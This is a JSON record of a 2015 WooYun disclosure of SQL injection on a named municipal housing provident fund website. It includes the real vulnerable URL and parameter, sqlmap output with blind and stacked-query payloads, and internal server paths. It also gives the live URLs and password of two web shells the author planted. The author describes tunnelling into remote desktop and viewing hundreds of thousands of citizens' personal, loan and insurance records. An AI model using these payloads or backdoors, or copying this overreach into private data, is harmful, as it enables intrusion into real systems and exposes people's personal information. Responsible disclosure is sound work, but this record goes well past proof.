{"id": 66355, "wybug_id": "wooyun-2015-0139745", "wybug_title": "甘肃省某市住房公积金管理中心SQL注入可导致系统被入侵（几十万个人详细信息泄露）", "wybug_corp": "甘肃省某住房公积金管理中心", "wybug_author": "二愣子", "wybug_date": "2015-09-10 15:49", "wybug_open_date": "2015-10-26 11:04", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-26：\t细节向公众公开  简要描述： 我先来探探风 详细说明：  1、SQL注入注入点：\nwww.zyzfgjj.com/search.asp (POST)keywords=1&image.x=10&image.y=11（参数就在keywords这里）\npayload\n---Place: POSTParameter: keywords    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: keywords=1%' AND 3415=3415 AND '%'='&image.x=10&image.y=11    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: keywords=1%'; WAITFOR DELAY '0:0:5'--&image.x=10&image.y=11---web server operating system: Windows 2008web application technology: ASP.NET, Microsoft IIS 7.5, ASPback-end DBMS: Microsoft SQL Server 2000sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: keywords    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: keywords=1%' AND 3415=3415 AND '%'='&image.x=10&image.y=11    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: keywords=1%'; WAITFOR DELAY '0:0:5'--&image.x=10&image.y=11---\n网站路径信息\nSITE \"gjj\" (id:1,bindings:http/192.168.200.3:80:,state:Started)SITE \"ghdetail\" (id:2,bindings:ftp/192.168.200.3:21:,state:Unknown)SITE \"jhdetail\" (id:3,bindings:ftp/192.168.200.3:7821:,state:Unknown)SITE \"nhdetail\" (id:4,bindings:ftp/192.168.200.3:7921:,state:Unknown)SITE \"zygjjweb\" (id:5,bindings:http/192.168.50.3:80:,state:Started)---command standard output:---VDIR \"gjj/\" (physicalPath:E:\\gjjsoft\\gjjgj)VDIR \"gjj/clpt/\" (physicalPath:E:\\gjjsoft\\clpt)VDIR \"gjj/gjjgj/\" (physicalPath:E:\\gjjsoft\\gjjgj)VDIR \"gjj/gjjdk/\" (physicalPath:E:\\gjjsoft\\gjjdk)VDIR \"gjj/gjjcw/\" (physicalPath:E:\\gjjsoft\\gjjcw)VDIR \"gjj/sjlk/\" (physicalPath:E:\\gjjsoft\\zygjjsjlk\\gjjgj)VDIR \"gjj/sjlkcw/\" (physicalPath:E:\\gjjsoft\\zygjjsjlk\\gjjcw)VDIR \"ghdetail/\" (physicalPath:E:\\ftp\\ghdetail)VDIR \"jhdetail/\" (physicalPath:E:\\ftp\\ghdetail\\jhdetail)VDIR \"nhdetail/\" (physicalPath:E:\\ftp\\nhdetail)VDIR \"zygjjweb/\" (physicalPath:E:\\\n这里直接可以通过注入点getshell，权限很高~~~菜刀马：\nhttp://www.zyzfgjj.com/UploadFiles/check.asp 密码jjy\n大马\nhttp://www.zyzfgjj.com/Editor/Dialog/test.asp 密码jjy\n   漏洞证明：  1、菜刀\n\n2、大马\n\n下面就是各种信息泄露了，开了个lcx进远程桌面1、15w信息\n\n2、200多万还款信息\n\n3、近8w保险信息\n\n4、6w多基本信息又是什么\n\n5、抵押信息？？\n\n6、3w多公务员信息？局长什么的~~~\n\n   修复方案：  过滤~~~   版权声明：转载请注明来源 二愣子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-09-11 11:02 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给甘肃分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-08 17:19 |    \t\t小人物Reno \t\t\t( 普通白帽子  |\t\t\t        Rank:477 漏洞数:112        | X)\t\t \n  我先来探探风    \n     2015-09-08 18:12 |    \t\t小红猪 \t\t\t( 普通白帽子  |\t\t\t        Rank:210 漏洞数:36        )\t\t \n  我先来探探风    \n     2015-10-26 13:43 |    \t\tfaith \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | 好好的。)\t\t \n  洞主，请教下物理路径是怎么爆出来的？    \n     2015-10-26 14:13 |    \t\tfaith \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | 好好的。)\t\t \n  @小人物Reno 这网站目录怎么来的？菜鸟求指导    \n     2015-10-26 17:57 |    \t\t小人物Reno \t\t\t( 普通白帽子  |\t\t\t        Rank:477 漏洞数:112        | X)\t\t \n  @faith 不是我发的→_→    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}